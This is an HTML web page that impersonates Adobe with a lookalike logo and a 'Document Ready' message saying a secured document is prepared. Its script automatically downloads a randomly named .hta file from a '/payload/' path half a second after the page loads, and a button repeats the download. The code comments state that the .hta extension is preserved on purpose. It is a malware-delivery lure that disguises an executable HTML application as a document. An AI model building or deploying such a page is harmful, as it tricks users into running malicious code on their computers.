<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Ready</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #f9f9f9; }
        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 500px; }
        .logo { width: 80px; margin-bottom: 20px; }
        h1 { font-size: 28px; color: #333; margin-bottom: 10px; }
        p { font-size: 16px; color: #666; line-height: 1.5; margin-bottom: 20px; }
        .filename { font-weight: bold; color: #333; }
        .btn { background-color: #ed2224; color: white; padding: 12px 24px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
        .btn:hover { background-color: #c41b1d; }
        .note { font-size: 13px; color: #888; margin-top: 16px; }
    </style>
</head>
<body>
    <div class="card">
        <svg class="logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
            <rect x="0" y="0" width="100" height="100" rx="22" fill="#ed2224"/>
            <polygon points="24,80 44,24 53,49 44,80" fill="#fff"/>
            <polygon points="58,80 76,24 76,80 67,80" fill="#fff"/>
        </svg>
        
        <h1>Document Ready</h1>
        <p>Your secured document has been prepared.</p>
        <p>The file <span id="fileName" class="filename">Adobe_Document.hta</span> will download automatically. If it doesn't start, click below.</p>
        
        <button class="btn" onclick="forceDownload()">Download Document</button>
        <div class="note">This usually only takes a few seconds.</div>
    </div>

    <script>
        // GET UNIQUE FILENAME FROM URL PARAMS (PRESERVES .HTA EXTENSION)
        const urlParams = new URLSearchParams(window.location.search);
        const uniqueFile = urlParams.get('file') || 'Adobe_Document_' + Math.floor(Math.random() * 900000 + 100000) + '.hta';
        document.getElementById('fileName').innerText = uniqueFile;

        // AUTO-TRIGGER DOWNLOAD ON PAGE LOAD
        window.onload = () => setTimeout(triggerDownload, 500);

        function triggerDownload() {
            const link = document.createElement('a');
            link.href = `/payload/${uniqueFile}`; // SENDS EXACT UNIQUE NAME TO SERVER
            link.download = uniqueFile;           // FORCES BROWSER TO USE UNIQUE NAME
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }

        function forceDownload() {
            triggerDownload();
            const btn = document.querySelector('.btn');
            btn.textContent = 'Download Started...';
            btn.disabled = true;
            btn.style.background = '#ccc';
        }
    </script>
</body>
</html>
